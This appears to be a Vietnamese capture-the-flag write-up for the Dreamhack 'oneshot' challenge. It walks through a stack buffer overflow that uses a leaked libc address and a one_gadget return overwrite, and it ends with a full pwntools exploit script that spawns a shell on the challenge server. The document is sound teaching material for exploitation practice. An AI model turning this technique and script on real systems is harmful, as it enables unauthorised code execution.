# Challenge: Oneshot

## Vấn đề
- [File challenge](https://github.com/haiwh07/CTFWriteUp/blob/main/dreamhack/oneshot_chall/oneshot)
- Chương trình thực thi như sau:
```
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char buf[24]; // [rsp+10h] [rbp-20h] BYREF
  __int64 v5; // [rsp+28h] [rbp-8h]

  v5 = 0LL;
  initialize();
  printf("stdout: %p\n", stdout);
  printf("MSG: ");
  read(0, buf, 46uLL);
  if ( v5 )
    exit(0);
  printf("MSG: %s\n", buf);
  memset(buf, 0, 16uLL);
  return 0;
}
```
- Checksec:
```
+ Arch:       amd64-64-little
+ RELRO:      Partial RELRO
+ Stack:      No canary found
+ NX:         NX enabled
+ PIE:        PIE enabled
+ Stripped:   No
```

## Giải pháp
- Khi thực thi, chương trình sẽ leak địa chỉ nào đấy từ libc, ta có thể lấy nó để có được libc base.
```
└─$ ./oneshot
stdout: 0x7d69b9b175c0
MSG:
```
- Do NX bật nên ta không thể tạo shellcode rồi đẩy vào return address, do đó hướng giải quyết hướng đến sẽ là sử dụng _ROPgadget_ hoặc _one_gadget_.
- Vậy nên, ta kiểm tra ROPgadget xem có thể khai thác gì:
```
└─$ ROPgadget --binary oneshot | grep "pop"
0x000000000000093c : add byte ptr [rax], al ; add byte ptr [rax], al ; pop rbp ; ret
0x00000000000008ee : add byte ptr [rax], al ; pop rbp ; ret
0x00000000000008ed : add byte ptr [rax], r8b ; pop rbp ; ret
0x00000000000008e0 : and byte ptr [rax], al ; test rax, rax ; je 0x8f0 ; pop rbp ; jmp rax
0x000000000000092d : and byte ptr [rax], al ; test rax, rax ; je 0x940 ; pop rbp ; jmp rax
0x00000000000008e5 : je 0x8f0 ; pop rbp ; jmp rax
0x0000000000000932 : je 0x940 ; pop rbp ; jmp rax
0x00000000000008e9 : loopne 0x951 ; nop dword ptr [rax + rax] ; pop rbp ; ret
0x0000000000000a3e : nop ; pop rbp ; ret
0x00000000000008eb : nop dword ptr [rax + rax] ; pop rbp ; ret
0x00000000000008ea : nop word ptr [rax + rax] ; pop rbp ; ret
0x0000000000000b4c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x0000000000000b4e : pop r13 ; pop r14 ; pop r15 ; ret
0x0000000000000b50 : pop r14 ; pop r15 ; ret
0x0000000000000b52 : pop r15 ; ret
0x0000000000000287 : pop rax ; ret
0x00000000000009ba : pop rbp ; jmp 0x900
0x00000000000008e7 : pop rbp ; jmp rax
0x0000000000000978 : pop rbp ; mov byte ptr [rip + 0x2006f0], 1 ; repz ret
0x0000000000000b4b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x0000000000000b4f : pop rbp ; pop r14 ; pop r15 ; ret
0x00000000000008f0 : pop rbp ; ret
0x0000000000000b53 : pop rdi ; ret
0x0000000000000b51 : pop rsi ; pop r15 ; ret
0x0000000000000b4d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
0x000000000000093a : test byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; pop rbp ; ret
0x00000000000008e3 : test eax, eax ; je 0x8f0 ; pop rbp ; jmp rax
0x0000000000000930 : test eax, eax ; je 0x940 ; pop rbp ; jmp rax
0x00000000000008e2 : test rax, rax ; je 0x8f0 ; pop rbp ; jmp rax
0x000000000000092f : test rax, rax ; je 0x940 ; pop rbp ; jmp rax
```
- Check luôn one_gadget:
```
└─$ one_gadget libc.so.6
0x4526a execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL || {[rsp+0x30], [rsp+0x38], [rsp+0x40], [rsp+0x48], ...} is a valid argv

0xf02a4 execve("/bin/sh", rsp+0x50, environ)
constraints:
  [rsp+0x50] == NULL || {[rsp+0x50], [rsp+0x58], [rsp+0x60], [rsp+0x68], ...} is a valid argv

0xf1147 execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL || {[rsp+0x70], [rsp+0x78], [rsp+0x80], [rsp+0x88], ...} is a valid argv
```
- Thì ta thấy one_gadget chỉ cần thanh ghi rsp và trong ROPgadget có địa chỉ **0x0000000000000b4d** thay đổi được rsp.
- Nhưng nhìn qua offset của read, ta thấy input được 46 bytes mà buf 24 bytes + 8 bytes của canary nhưng đã tắt + 8 bytes của saved rbp thì để overwrite return address ta chỉ còn 6 bytes. 
> Do đó, chỉ có thể khai thác bằng one_gadget.

## Quá trình
- Lấy địa chỉ chương trình đã leak, ta thấy rằng đây là một địa chỉ bất kì trên libc. Từ đó, ta tính được libc base. 
- Từ quá trình tính offset, ta biết để tới saved rbp cần 32 bytes và phải overwrite 8 bytes saved rbp mới tới return address.
- Khi debug, đẩy 32 bytes rác vào để overwrite chương trình lúc này sẽ báo lỗi vì v5 ([rsp +8]) == 0 thì mới jmp qua call exit(0).
```
.text:0000000000000AA7                 cmp     [rbp+var_8], 0
.text:0000000000000AAC                 jz      short loc_AB8
.text:0000000000000AAE                 mov     edi, 0          ; status
.text:0000000000000AB3                 call    _exit
```
- Thì khi viết payload phần [rbp+8] phải đẩy 8 bytes 0 vào.
- Sau đó đẩy 8 bytes rác vào saved rbp + 8 bytes của one_gadget.
> Chương trình chạy execve("/bin/sh"), ta sẽ có được shell.

## Script
```
#!/usr/bin/env python3

from pwn import *

exe = ELF('oneshot_patched', checksec=False)
libc = ELF('libc.so.6', checksec=False)
context.binary = exe

info = lambda msg: log.info(msg)
s = lambda data, proc=None: proc.send(data) if proc else p.send(data)
sa = lambda msg, data, proc=None: proc.sendafter(msg, data) if proc else p.sendafter(msg, data)
sl = lambda data, proc=None: proc.sendline(data) if proc else p.sendline(data)
sla = lambda msg, data, proc=None: proc.sendlineafter(msg, data) if proc else p.sendlineafter(msg, data)
sn = lambda num, proc=None: proc.send(str(num).encode()) if proc else p.send(str(num).encode())
sna = lambda msg, num, proc=None: proc.sendafter(msg, str(num).encode()) if proc else p.sendafter(msg, str(num).encode())
sln = lambda num, proc=None: proc.sendline(str(num).encode()) if proc else p.sendline(str(num).encode())
slna = lambda msg, num, proc=None: proc.sendlineafter(msg, str(num).encode()) if proc else p.sendlineafter(msg, str(num).encode())
def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
        b*main+138
        c
        ''')
        input()


if args.REMOTE:
    p = remote('host3.dreamhack.games', 15470)
else:
    p = process([exe.path])
GDB()

##########################
### STAGE 1: Leak libc ###
##########################
p.recvuntil(b'stdout: ')
libc_leak = int(p.recvline()[:-1], 16)
libc.address = libc_leak - 0x3c5620
info("Libc leak: " + hex(libc_leak))
info("Libc address: " + hex(libc.address))

#########################################
### STAGE 2: Overwrite Return Address ###
#########################################
one_gadget = 0xf1147
payload = flat(
    b'A'*8*3,
    p64(0), # Set v5 = 0 
    p64(0), # Saved rbp
    libc.address + one_gadget,
    )
sla(b'MSG: ', payload)

p.interactive()
```
